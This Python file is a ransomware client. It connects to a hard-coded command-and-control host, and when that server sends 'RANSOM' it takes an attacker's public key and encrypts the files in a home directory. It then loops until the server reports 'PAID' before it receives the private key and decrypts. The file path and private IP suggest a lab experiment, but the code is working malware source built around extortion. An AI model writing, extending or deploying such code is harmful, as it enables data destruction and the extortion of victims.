from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import load_pem_private_key, load_pem_public_key

import socket
import time
import ransom
import pickle

"""
"""

RETRY_TIME = 5 # Seconds
HOST = "192.168.101.70"
PORT = 8080

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect(self):
        try:
            self.socket.connect((self.host, self.port))
            print(f"Connected to server at {self.host}:{self.port}")
        except:
            self.retry()

    def run(self):
        while True:
            try:
                data = self.socket.recv(2048)
                self.parse(data)
            except ConnectionResetError:
                self.retry()
                return
            except Exception as e:
                print(e)
    
    def parse(self, data):
        match data.decode():
            case "RANSOM":
                self.ransomware()
        

    def retry(self):
        print("Couldn't connect, retrying in", RETRY_TIME)
        time.sleep(RETRY_TIME)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # fresh socket
        self.connect()


### ATTACKS
    def ransomware(self): # pub_key is PEM encoded string possibly idk
        # Send ready for attack
        self.socket.send("READY".encode())

        # Attacker responds with public key
        pub_key_raw = self.socket.recv(4096)
        pub_key = load_pem_public_key(pub_key_raw)

        encrypter = ransom.Encrypter(pub_key) # Create encrypter with pub key
        ransomware = ransom.Ransomware("/home/galen/real_test/", encrypter)
        # Run Encrypt
        ransomware.encrypt_files()
        # Send Confirm
        self.socket.send("OK".encode())
        paid = False
        while not paid:
            data = self.socket.recv(2048)
            if data.decode() == "PAID":
                paid = True
                self.socket.send("OK".encode())
            else:
                self.socket.send("PONG".encode())

        # Wait For Private Key
        priv_key_raw = self.socket.recv(4096)
        priv_key = load_pem_private_key(priv_key_raw, password=None)
        # Run Decrypt
        ransomware.decrypt_files("/home/galen/real_test/", priv_key)
        # Final



c = Client(HOST, PORT)
c.connect()
c.run()
